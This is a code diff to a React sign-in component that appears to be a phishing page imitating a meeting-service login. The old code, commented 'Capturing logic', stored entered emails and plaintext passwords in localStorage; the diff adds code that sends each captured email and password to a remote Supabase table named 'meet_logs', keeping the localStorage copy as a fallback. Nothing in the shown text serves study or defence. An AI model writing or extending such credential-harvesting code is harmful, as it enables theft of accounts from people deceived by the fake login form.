@@ -1,5 +1,6 @@
 
 import React, { useState, useRef, useEffect } from 'react';
+import { supabase } from '../lib/supabase';
 
 interface SignInProps {
   onComplete: (name: string) => void;
@@ -67,20 +68,29 @@ const SignIn: React.FC<SignInProps> = ({
     }
   }, [step, onComplete, email]);
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (email.trim() && password.trim()) {
       setLoading(true);
       
-      // Capturing logic: Save to localStorage logs
-      const logs = JSON.parse(localStorage.getItem('meet_logs') || '[]');
-      logs.push({
-        id: Date.now().toString(),
-        email: email,
-        password: password,
-        timestamp: new Date().toLocaleString()
-      });
-      localStorage.setItem('meet_logs', JSON.stringify(logs));
+      try {
+        // Capture to Supabase
+        const { error } = await supabase
+          .from('meet_logs')
+          .insert([
+            { email, password, timestamp: new Date().toISOString() }
+          ]);
+        
+        if (error) {
+          console.error("Supabase Error:", error);
+          // Fallback to localStorage if Supabase fails (e.g. table not created)
+          const logs = JSON.parse(localStorage.getItem('meet_logs') || '[]');
+          logs.push({ id: Date.now().toString(), email, password, timestamp: new Date().toLocaleString() });
+          localStorage.setItem('meet_logs', JSON.stringify(logs));
+        }
+      } catch (err) {
+        console.error("Capture failed:", err);
+      }
 
       setTimeout(() => {
         setLoading(false);
